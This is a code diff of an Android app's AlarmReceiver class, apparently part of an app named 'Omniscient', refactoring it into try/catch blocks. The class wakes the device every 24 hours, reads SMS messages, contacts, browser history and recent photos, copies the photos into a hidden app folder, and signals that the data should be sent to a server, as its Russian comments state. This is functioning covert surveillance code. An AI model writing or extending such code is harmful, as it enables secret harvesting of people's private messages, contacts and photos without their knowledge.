@@ -6,11 +6,7 @@ import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.media.Ringtone;
-import android.media.RingtoneManager;
-import android.net.Uri;
 import android.os.Build;
-import android.os.Environment;
 import android.util.Log;
 
 import com.postal.omniscient.postal.adapter.AdapterData;
@@ -29,7 +25,6 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.text.SimpleDateFormat;
-import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
@@ -42,65 +37,58 @@ public class AlarmReceiver extends BroadcastReceiver {
     }
 
     @Override
+    //Сбор данных для отправки на сервер каждые 24 часа
     public void onReceive(Context context, Intent intent) {
         // TODO: This method is called when the BroadcastReceiver is receiving
-        // an Intent broadcast.
+        try {
 
-//        Uri uri = Uri.parse(Environment.getExternalStorageDirectory().getAbsolutePath() + "/media/ringtone/sao.mp3");
-//        Ringtone ringtone = RingtoneManager.getRingtone(context, uri);
-//        ringtone.play();
-//        Log.i("MyMsg", "VSE PROPALLLLLLLOOOOOO");
-        ReadContacts contact = new ReadContacts(context);
-        BrowserHistory browser = new BrowserHistory(context,context.getContentResolver());
-        ReadSms sms = new ReadSms(context, context.getContentResolver());
-        sms.smsToJson();
-        contact.getContacts();
-        browser.historyToJson();
-        saveIMAGE(context, context.getContentResolver());
+            ReadContacts contact = new ReadContacts(context);
+            BrowserHistory browser = new BrowserHistory(context, context.getContentResolver());
+            ReadSms sms = new ReadSms(context, context.getContentResolver());
+            sms.smsToJson();
+            contact.getContacts();
+            browser.historyToJson();
+            saveIMAGE(context, context.getContentResolver());
 
-        AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
-        Intent myIntent = new Intent(context, AlarmReceiver.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
+            AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
+            Intent myIntent = new Intent(context, AlarmReceiver.class);
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
 
-        if (SDK_INT < Build.VERSION_CODES.KITKAT) {
-            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*60*24, pendingIntent);
-        }
-        else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
-            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*60*24, pendingIntent);
-        }
-        else if (SDK_INT >= Build.VERSION_CODES.M) {
-            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*60*24, pendingIntent);
-        }
-
-        EventBus.getDefault().post(new EventBusData("allfile"));// если есть коннект пробуем отправить новые данные на сервер
-    }
-
-    private void saveIMAGE(Context context, ContentResolver contentResolver) {
-        //IMEGE
-        AllImages img = new AllImages(contentResolver);
-
-//        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр
-//        long start_date = end_date;// дата из БД последней удачной передачи данных
-
-       // img.getAllImages();
-        List<AdapterData> listOfAllImages = img.getLastImages();
-        String patchFile;
-        for (AdapterData a : listOfAllImages) {
-            if(!a.getAddress().equals("")){
-                patchFile = a.getAddress();
-                Log.i("MyMsg", "KARTINKA     "+new File(patchFile).getName());
-                // добавляем свой каталог к пути
-                File pathToFile = new File(context.getFilesDir(), "/Omniscient/Image");//DIR);
-                copyFile(patchFile, pathToFile.toString());
-                //переименовуем файл
-                String date = new SimpleDateFormat("yyyy_MM_dd_HH-mm")
-                        .format(new Date());
-                File file1 = new File(pathToFile.toString()+"/"+new File(patchFile).getName());
-                File file2 = new File(pathToFile.toString()+"/"+date+"_"+new File(patchFile).getName());
-                file1.renameTo(file2);
+            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
+            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
+            } else if (SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
             }
-        }
+
+            EventBus.getDefault().post(new EventBusData("allfile"));// если есть коннект пробуем отправить новые данные на сервер
+        }catch (Exception e){Log.i(Msg, "Error AlarmReceiver onReceive "+e);}
     }
+    //IMEGE
+    private void saveIMAGE(Context context, ContentResolver contentResolver) {
+        try {
+            AllImages img = new AllImages(contentResolver);
+
+            List<AdapterData> listOfAllImages = img.getLastImages();
+            String patchFile;
+            for (AdapterData a : listOfAllImages) {
+                if (!a.getAddress().equals("")) {
+                    patchFile = a.getAddress();
+                    // добавляем свой каталог к пути
+                    File pathToFile = new File(context.getFilesDir(), "/Omniscient/Image");//DIR);
+                    copyFile(patchFile, pathToFile.toString());
+                    //переименовуем файл
+                    String date = new SimpleDateFormat("yyyy_MM_dd_HH-mm")
+                            .format(new Date());
+                    File file1 = new File(pathToFile.toString() + "/" + new File(patchFile).getName());
+                    File file2 = new File(pathToFile.toString() + "/" + date + "_" + new File(patchFile).getName());
+                    file1.renameTo(file2);
+                }
+            }
+        }catch (Exception e){Log.i(Msg, "Error AlarmReceiver saveIMAGE "+e);}
+    }
+    //копируем нужные файлы в папку программы для отправки на сервер
     private void copyFile(String inputPath, String outputPath) {
 
         InputStream in = null;
@@ -116,9 +104,7 @@ public class AlarmReceiver extends BroadcastReceiver {
             String inputFile = new File (inputPath).getName();
             in = new FileInputStream(inputPath);
             out = new FileOutputStream(outputPath +"/"+ inputFile);
-//            Log.i("MyMsg", "File dir Image name "+inputFile);
-//            Log.i("MyMsg", "File dir Image "+outputPath+"/"+inputFile);
-//            Log.i("MyMsg", "File dir Image inputPath "+inputPath);
+
             byte[] buffer = new byte[1024];
             int read;
             while ((read = in.read(buffer)) != -1) {
@@ -136,8 +122,7 @@ public class AlarmReceiver extends BroadcastReceiver {
             Log.e(Msg, fnfe1.getMessage());
         }
         catch (Exception e) {
-            Log.e(Msg, e.getMessage());
+            Log.i(Msg, "Error AlarmReceiver copyFile "+e);
         }
-
     }
 }
